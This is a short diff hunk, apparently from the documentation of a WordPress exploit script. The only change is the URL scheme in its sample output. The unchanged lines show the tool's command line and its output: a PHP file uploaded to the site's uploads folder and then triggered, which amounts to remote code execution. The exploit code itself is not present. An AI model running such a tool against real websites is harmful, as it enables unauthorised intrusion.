@@ -30,7 +30,7 @@ python3 exploit.py -v -u https://target-IP/?p=7
   [+] Sending payload to target
   [+] Successful file upload!
 
-Uploaded File Location: http://target-IP/wp-content/uploads/2023/08/QotTkAFBsf.php
+Uploaded File Location: https://target-IP/wp-content/uploads/2023/08/QotTkAFBsf.php
 
   [+] Sending request to uploaded file...
   [+] Successfully triggered the uploaded file!
